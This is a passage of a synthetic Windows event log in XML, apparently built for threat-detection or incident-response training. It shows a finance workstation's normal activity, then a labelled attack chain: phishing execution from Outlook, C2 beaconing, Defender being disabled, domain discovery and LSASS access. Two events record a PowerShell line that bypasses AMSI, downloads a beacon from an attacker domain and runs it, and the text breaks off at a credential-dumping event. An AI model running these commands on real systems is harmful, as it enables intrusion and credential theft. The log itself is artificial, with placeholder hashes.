      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="param1">Cryptographic Services</Data>
      <Data Name="param2">running</Data>
      <Data Name="Binary">430072007900700074005300760063000000</Data>
    </EventData>
  </Event>

  <!-- 4. Service Control Manager: Windows Update running (7036) at 09:30:06Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" />
      <EventID>7036</EventID>
      <TimeCreated SystemTime="2026-10-10T09:30:06.000Z" />
      <EventRecordID>4904</EventRecordID>
      <Channel>System</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="param1">Windows Update</Data>
      <Data Name="param2">running</Data>
    </EventData>
  </Event>

  <!-- 5. Service Control Manager: Background Intelligent Transfer Service running (7036) at 09:30:07Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" />
      <EventID>7036</EventID>
      <TimeCreated SystemTime="2026-10-10T09:30:07.000Z" />
      <EventRecordID>4905</EventRecordID>
      <Channel>System</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="param1">Background Intelligent Transfer Service</Data>
      <Data Name="param2">running</Data>
    </EventData>
  </Event>

  <!-- 6. Service Control Manager: Print Spooler running (7036) at 09:30:08Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" />
      <EventID>7036</EventID>
      <TimeCreated SystemTime="2026-10-10T09:30:08.000Z" />
      <EventRecordID>4906</EventRecordID>
      <Channel>System</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="param1">Print Spooler</Data>
      <Data Name="param2">running</Data>
    </EventData>
  </Event>

  <!-- 7. Service Control Manager: Microsoft Defender Antivirus Service running (7036) at 09:30:09Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" />
      <EventID>7036</EventID>
      <TimeCreated SystemTime="2026-10-10T09:30:09.000Z" />
      <EventRecordID>4907</EventRecordID>
      <Channel>System</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="param1">Microsoft Defender Antivirus Service</Data>
      <Data Name="param2">running</Data>
    </EventData>
  </Event>

  <!-- 8. Defender Real-Time Protection Enabled (5000) at 09:30:10Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Windows Defender" />
      <EventID>5000</EventID>
      <TimeCreated SystemTime="2026-10-10T09:30:10.000Z" />
      <EventRecordID>4908</EventRecordID>
      <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="ProductName">Microsoft Defender Antivirus</Data>
    </EventData>
  </Event>

  <!-- 9. Normal User Interactive Logon: jdoe (4624) at 09:31:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{{54849625-5478-4994-A5BA-3E3B0328C30D}}" />
      <EventID>4624</EventID>
      <TimeCreated SystemTime="2026-10-10T09:31:00.000Z" />
      <EventRecordID>4909</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">jdoe</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="LogonType">2</Data>
      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
      <Data Name="IpAddress">127.0.0.1</Data>
      <Data Name="ProcessName">C:\\Windows\\System32\\winlogon.exe</Data>
    </EventData>
  </Event>

  <!-- 10. Kerberos TGT Request for jdoe (4768) at 09:31:02Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4768</EventID>
      <TimeCreated SystemTime="2026-10-10T09:31:02.000Z" />
      <EventRecordID>4910</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">jdoe</Data>
      <Data Name="TargetDomainName">TARGET.LOCAL</Data>
      <Data Name="ServiceName">krbtgt</Data>
      <Data Name="TicketOptions">0x40810010</Data>
      <Data Name="TicketEncryptionType">0x12</Data>
      <Data Name="IpAddress">10.0.4.15</Data>
    </EventData>
  </Event>

  <!-- 11. Process Creation: Explorer.exe (4688) at 09:31:05Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T09:31:05.000Z" />
      <EventRecordID>4911</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Windows\\explorer.exe</Data>
      <Data Name="CommandLine">C:\\Windows\\explorer.exe</Data>
      <Data Name="ParentProcessName">C:\\Windows\\System32\\userinit.exe</Data>
    </EventData>
  </Event>

  <!-- 12. Process Creation: RuntimeBroker.exe (4688) at 09:31:08Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T09:31:08.000Z" />
      <EventRecordID>4912</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\RuntimeBroker.exe</Data>
      <Data Name="CommandLine">C:\\Windows\\System32\\RuntimeBroker.exe -Embedding</Data>
      <Data Name="ParentProcessName">C:\\Windows\\System32\\svchost.exe</Data>
    </EventData>
  </Event>

  <!-- 13. Process Creation: SearchApp.exe (4688) at 09:31:10Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T09:31:10.000Z" />
      <EventRecordID>4913</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe</Data>
      <Data Name="CommandLine">"C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca</Data>
      <Data Name="ParentProcessName">C:\\Windows\\System32\\svchost.exe</Data>
    </EventData>
  </Event>

  <!-- 14. Process Creation: taskhostw.exe (4688) at 09:31:12Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T09:31:12.000Z" />
      <EventRecordID>4914</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\taskhostw.exe</Data>
      <Data Name="CommandLine">taskhostw.exe {{2227A280-3AEA-4069-A266-57D70B3050BE}}</Data>
      <Data Name="ParentProcessName">C:\\Windows\\System32\\svchost.exe</Data>
    </EventData>
  </Event>

  <!-- 15. Process Creation: OneDrive.exe (4688) at 09:31:15Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T09:31:15.000Z" />
      <EventRecordID>4915</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe</Data>
      <Data Name="CommandLine">"C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background</Data>
      <Data Name="ParentProcessName">C:\\Windows\\explorer.exe</Data>
    </EventData>
  </Event>

  <!-- 16. Process Creation: OUTLOOK.EXE (4688) at 09:35:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T09:35:00.000Z" />
      <EventRecordID>4916</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE</Data>
      <Data Name="CommandLine">"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"</Data>
      <Data Name="ParentProcessName">C:\\Windows\\explorer.exe</Data>
    </EventData>
  </Event>

  <!-- 17. Sysmon Event 22: DNS Query to outlook.office365.com at 09:35:05Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>22</EventID>
      <TimeCreated SystemTime="2026-10-10T09:35:05.000Z" />
      <EventRecordID>4917</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE</Data>
      <Data Name="QueryName">outlook.office365.com</Data>
      <Data Name="QueryResults">52.96.166.146</Data>
    </EventData>
  </Event>

  <!-- 18. Process Creation: chrome.exe (4688) at 09:38:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T09:38:00.000Z" />
      <EventRecordID>4918</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data>
      <Data Name="CommandLine">"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" http://internal-portal.target.local</Data>
      <Data Name="ParentProcessName">C:\\Windows\\explorer.exe</Data>
    </EventData>
  </Event>

  <!-- 19. Sysmon Event 22: DNS Query to internal-portal.target.local at 09:38:02Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>22</EventID>
      <TimeCreated SystemTime="2026-10-10T09:38:02.000Z" />
      <EventRecordID>4919</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data>
      <Data Name="QueryName">internal-portal.target.local</Data>
      <Data Name="QueryResults">10.0.4.50</Data>
    </EventData>
  </Event>

  <!-- 20. Sysmon Event 3: Network Connection to internal portal (10.0.4.50:80) at 09:38:05Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>3</EventID>
      <TimeCreated SystemTime="2026-10-10T09:38:05.000Z" />
      <EventRecordID>4920</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data>
      <Data Name="SourceIp">10.0.4.15</Data>
      <Data Name="SourcePort">49720</Data>
      <Data Name="DestinationIp">10.0.4.50</Data>
      <Data Name="DestinationPort">80</Data>
      <Data Name="DestinationHostname">internal-portal.target.local</Data>
    </EventData>
  </Event>

  <!-- 21. Document Printed: Event 307 at 09:42:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-PrintService" />
      <EventID>307</EventID>
      <TimeCreated SystemTime="2026-10-10T09:42:00.000Z" />
      <EventRecordID>4921</EventRecordID>
      <Channel>Microsoft-Windows-PrintService/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <UserData>
      <DocumentPrinted xmlns="http://manifests.microsoft.com/win/2004/08/windows/printing">
        <Param1>42</Param1>
        <Param2>Q3_Financial_Quarterly_Forecast.pdf</Param2>
        <Param3>jdoe</Param3>
        <Param4>PRINTER-FIN-FLOOR2</Param4>
        <Param5>4</Param5>
      </DocumentPrinted>
    </UserData>
  </Event>

  <!-- 22. Workstation Locked (4800) at 09:48:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4800</EventID>
      <TimeCreated SystemTime="2026-10-10T09:48:00.000Z" />
      <EventRecordID>4922</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">jdoe</Data>
      <Data Name="TargetDomainName">TARGET</Data>
    </EventData>
  </Event>

  <!-- 23. Workstation Unlocked (4801) at 09:55:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4801</EventID>
      <TimeCreated SystemTime="2026-10-10T09:55:00.000Z" />
      <EventRecordID>4923</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">jdoe</Data>
      <Data Name="TargetDomainName">TARGET</Data>
    </EventData>
  </Event>

  <!-- 24. Service Control Manager: Windows Modules Installer stopped (7036) at 09:58:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" />
      <EventID>7036</EventID>
      <TimeCreated SystemTime="2026-10-10T09:58:00.000Z" />
      <EventRecordID>4924</EventRecordID>
      <Channel>System</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="param1">Windows Modules Installer</Data>
      <Data Name="param2">stopped</Data>
    </EventData>
  </Event>

  <!-- ===================================================================== -->
  <!-- SECTION B: Attack Execution, C2, Credential Dumping & Exfiltration    -->
  <!-- ===================================================================== -->

  <!-- 25. Interactive User Session Active (4624) at 10:00:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{{54849625-5478-4994-A5BA-3E3B0328C30D}}" />
      <EventID>4624</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:00.000Z" />
      <EventRecordID>5001</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">jdoe</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="LogonType">2</Data>
      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
      <Data Name="IpAddress">127.0.0.1</Data>
      <Data Name="ProcessName">C:\\Windows\\System32\\winlogon.exe</Data>
    </EventData>
  </Event>

  <!-- 26. Phishing Execution: OUTLOOK.EXE spawns malicious invoice script (4688) at 10:00:02Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:02.000Z" />
      <EventRecordID>5002</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\cmd.exe</Data>
      <Data Name="CommandLine">cmd.exe /c "C:\\Users\\jdoe\\AppData\\Local\\Temp\\Invoice_Oct2026_Confidential.pdf.cmd"</Data>
      <Data Name="ParentProcessName">C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE</Data>
    </EventData>
  </Event>

  <!-- 27. Suspicious PowerShell Invocation from cmd.exe (4688) at 10:00:03Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:03.000Z" />
      <EventRecordID>5003</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
      <Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); (New-Object System.Net.WebClient).DownloadFile('http://evil-payloads-delivery.org/beacon_updater.exe', 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe'); Start-Process 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe'"</Data>
      <Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data>
    </EventData>
  </Event>

  <!-- 28. PowerShell Script Block Logging (Event 4104) at 10:00:04Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-PowerShell" />
      <EventID>4104</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:04.000Z" />
      <EventRecordID>5004</EventRecordID>
      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="MessageNumber">1</Data>
      <Data Name="MessageTotal">1</Data>
      <Data Name="ScriptBlockText">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); (New-Object System.Net.WebClient).DownloadFile('http://evil-payloads-delivery.org/beacon_updater.exe', 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe'); Start-Process 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe'</Data>
    </EventData>
  </Event>

  <!-- 29. Sysmon Event 22: DNS Query to C2 Domain at 10:00:05Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{{5770385F-C22A-43E0-BF4C-06F5698FFBD9}}" />
      <EventID>22</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:05.000Z" />
      <EventRecordID>5005</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
      <Data Name="QueryName">evil-payloads-delivery.org</Data>
      <Data Name="QueryResults">185.220.101.45</Data>
    </EventData>
  </Event>

  <!-- 30. Defender Real-Time Protection Disabled (5001) at 10:00:07Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Windows Defender" />
      <EventID>5001</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:07.000Z" />
      <EventRecordID>5006</EventRecordID>
      <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="ProductName">Microsoft Defender Antivirus</Data>
      <Data Name="OldValue">Enabled</Data>
      <Data Name="NewValue">Disabled</Data>
    </EventData>
  </Event>

  <!-- 31. Sysmon Event 13: Registry Value Set - DisableRealtimeMonitoring at 10:00:07.5Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>13</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:07.500Z" />
      <EventRecordID>5007</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
      <Data Name="TargetObject">HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring</Data>
      <Data Name="Details">DWORD (0x00000001)</Data>
    </EventData>
  </Event>

  <!-- 32. Sysmon Event 11: File Create for beacon_updater.exe at 10:00:08Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>11</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:08.000Z" />
      <EventRecordID>5008</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
      <Data Name="TargetFilename">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
      <Data Name="CreationUtcTime">2026-10-10 10:00:08.000</Data>
      <Data Name="Hashes">MD5={PE_MD5},SHA256={PE_SHA256}</Data>
    </EventData>
  </Event>

  <!-- 33. Process Creation (4688) for beacon_updater.exe at 10:00:10Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:10.000Z" />
      <EventRecordID>5009</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
      <Data Name="CommandLine">"C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe" -c2 185.220.101.45:443 -interval 5</Data>
      <Data Name="ParentProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
      <Data Name="Hashes">MD5={PE_MD5},SHA256={PE_SHA256}</Data>
    </EventData>
  </Event>

  <!-- 34. Sysmon Event 3: Network Connection to C2 Server (185.220.101.45:443) at 10:00:15Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>3</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:15.000Z" />
      <EventRecordID>5010</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Image">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
      <Data Name="SourceIp">10.0.4.15</Data>
      <Data Name="SourcePort">49812</Data>
      <Data Name="DestinationIp">185.220.101.45</Data>
      <Data Name="DestinationPort">443</Data>
      <Data Name="DestinationHostname">c2.evil-payloads-delivery.org</Data>
    </EventData>
  </Event>

  <!-- 35. Process Creation: Discovery LOLBin whoami.exe (4688) at 10:00:18Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:18.000Z" />
      <EventRecordID>5011</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\whoami.exe</Data>
      <Data Name="CommandLine">whoami.exe /all</Data>
      <Data Name="ParentProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
    </EventData>
  </Event>

  <!-- 36. Process Creation: Discovery LOLBin net.exe user /domain (4688) at 10:00:20Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:20.000Z" />
      <EventRecordID>5012</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\net.exe</Data>
      <Data Name="CommandLine">net.exe user /domain</Data>
      <Data Name="ParentProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
    </EventData>
  </Event>

  <!-- 37. Local Group Membership Enumerated (4798) at 10:00:21Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4798</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:21.000Z" />
      <EventRecordID>5013</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">jdoe</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="ProcessName">C:\\Windows\\System32\\net1.exe</Data>
    </EventData>
  </Event>

  <!-- 38. Process Creation: Discovery LOLBin net.exe group "Domain Admins" (4688) at 10:00:22Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:22.000Z" />
      <EventRecordID>5014</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\net.exe</Data>
      <Data Name="CommandLine">net.exe group "Domain Admins" /domain</Data>
      <Data Name="ParentProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
    </EventData>
  </Event>

  <!-- 39. Security-Enabled Group Enumerated (4799) at 10:00:23Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4799</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:23.000Z" />
      <EventRecordID>5015</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">Domain Admins</Data>
      <Data Name="TargetDomainName">TARGET</Data>
      <Data Name="ProcessName">C:\\Windows\\System32\\net1.exe</Data>
    </EventData>
  </Event>

  <!-- 40. Process Creation: Discovery LOLBin nltest.exe (4688) at 10:00:24Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:24.000Z" />
      <EventRecordID>5016</EventRecordID>
      <Channel>Security</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">jdoe</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\nltest.exe</Data>
      <Data Name="CommandLine">nltest.exe /dclist:target.local</Data>
      <Data Name="ParentProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
    </EventData>
  </Event>

  <!-- 41. Sysmon Event 10: ProcessAccess LSASS Memory Handle Request at 10:00:25Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" />
      <EventID>10</EventID>
      <TimeCreated SystemTime="2026-10-10T10:00:25.000Z" />
      <EventRecordID>5017</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="SourceImage">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
      <Data Name="TargetImage">C:\\Windows\\System32\\lsass.exe</Data>
      <Data Name="GrantedAccess">0x1010</Data>
      <Data Name="CallTrace">C:\\Windows\\SYSTEM32\\ntdll.dll+9d4e4|C:\\Windows\\System32\\KERNELBASE.dll+2c34e</Data>
    </EventData>
  </Event>

  <!-- 42. Process Creation: Credential Dumping via comsvcs MiniDump (4688) at 10:00:26Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
